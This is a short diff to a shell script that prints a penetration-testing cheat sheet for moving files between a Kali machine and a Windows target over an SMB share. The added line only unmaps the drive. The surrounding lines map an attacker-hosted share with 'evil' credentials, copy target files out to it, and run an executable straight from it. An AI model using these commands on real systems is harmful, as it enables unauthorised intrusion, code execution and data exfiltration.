@@ -44,6 +44,7 @@ echo -e "    net use Z: \\\\\\$ip\share /u:evil evil"
 echo -e "    copy Z:\\\kali_to_target.exe"
 echo -e "    copy target_to_kali.txt Z:\\"
 echo -e "    \\\\\\$ip\\\share\\\file.exe ${Comment}# run executable${End}"
+echo -e "    net use Z: /delete"
 echo -e ""
 
 
